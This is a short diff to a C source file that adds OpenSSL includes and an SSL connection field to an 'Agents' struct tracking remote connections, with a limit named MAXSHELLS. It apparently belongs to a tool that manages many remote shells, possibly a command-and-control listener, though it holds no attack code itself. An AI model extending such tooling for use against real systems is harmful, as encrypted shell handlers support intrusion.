@@ -4,6 +4,8 @@
 #include <unistd.h>
 #include <sys/types.h>
 #include <signal.h>
+#include <openssl/ssl.h>
+#include <openssl/err.h>
 
 #define MAXSHELLS 100
 
@@ -12,6 +14,7 @@ typedef struct {
 	char ip[16];
 	int index;
 	int fd;
+	SSL *sslfd;
 	unsigned alive	:	1;
 	unsigned ssl	:	1;
 } Agents;
